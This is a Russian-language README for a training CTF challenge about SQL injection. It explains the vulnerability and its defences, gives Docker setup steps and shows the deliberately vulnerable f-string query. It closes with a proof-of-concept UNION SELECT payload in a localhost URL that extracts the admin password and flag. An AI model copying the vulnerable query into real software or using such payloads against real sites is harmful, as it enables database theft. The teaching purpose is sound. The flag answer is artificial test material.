# SQL Injection CTF Challenge

Этот репозиторий содержит CTF-задачу, демонстрирующую уязвимость SQL Injection (SQLi) в веб-приложении. Задача позволяет изучить, как возникает уязвимость, как её эксплуатировать и как защититься от неё.

## Описание уязвимости

### Что такое SQL Injection?
SQL Injection — это уязвимость, которая возникает, когда злоумышленник может внедрить произвольный SQL-код в запросы к базе данных. Это происходит из-за недостаточной проверки или санитизации пользовательского ввода.

### Почему возникает уязвимость?
Уязвимость возникает, когда:
1. Приложение напрямую использует пользовательский ввод в SQL-запросах.
2. Входные данные не проверяются и не экранируются.
3. Приложение не использует подготовленные выражения (prepared statements) или параметризованные запросы.

## Способы защиты от уязвимости

1. Использование подготовленных выражений (prepared statements):
Всегда используйте параметризованные запросы или подготовленные выражения. Пример для Python (с использованием `PyMySQL`):
   ```python
   cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
2. Валидация и санитизация входных данных: Проверяйте и очищайте все пользовательские данные перед использованием в SQL-запросах. Используйте регулярные выражения для удаления нежелательных символов.

3. Ограничение прав доступа к базе данных: Используйте учётные записи с минимальными необходимыми привилегиями.

4. Использование ORM: Используйте ORM (Object-Relational Mapping) для автоматической защиты от SQLi.

Запуск приложения
Требования
Установленный Docker и Docker Compose.

Команды для запуска
Клонируйте репозиторий:

    git clone https://github.com/nnikk777/ctf-2.git

Запустите докер: 

    docker-compose up --build
Откройте веб-браузер и перейдите по адресу:

    http://localhost:5000

В данном приложении уязвимость SQL Injection присутствует на странице отображения статей. Параметр article_id передаётся напрямую в SQL-запрос без какой-либо проверки или санитизации. Это позволяет злоумышленнику внедрить произвольный SQL-код.

Пример уязвимого кода:

python

    sql = f"SELECT text FROM articles WHERE id = {article_id}"
    cursor.execute(sql)
POC-эксплоит для получения флага
Шаг 1: Найдите уязвимость
Перейдите на главную страницу приложения:

    http://localhost:5000
Шаг 2: Используйте SQL Injection
Введите следующий URL для получения пароля администратора:


    http://localhost:5000/?article_id=-1 UNION SELECT 1,password,3 FROM users WHERE username='admin'-- 
Шаг 3: Получите флаг
На странице отобразится пароль администратора (флаг) в виде:


    CTF{Uni0n_S3l3ct_1s_P0wer}
Шаг 4: Используйте флаг для входа
Перейдите на страницу входа:


    http://localhost:5000/login
Введите логин admin и полученный пароль для получения флага.
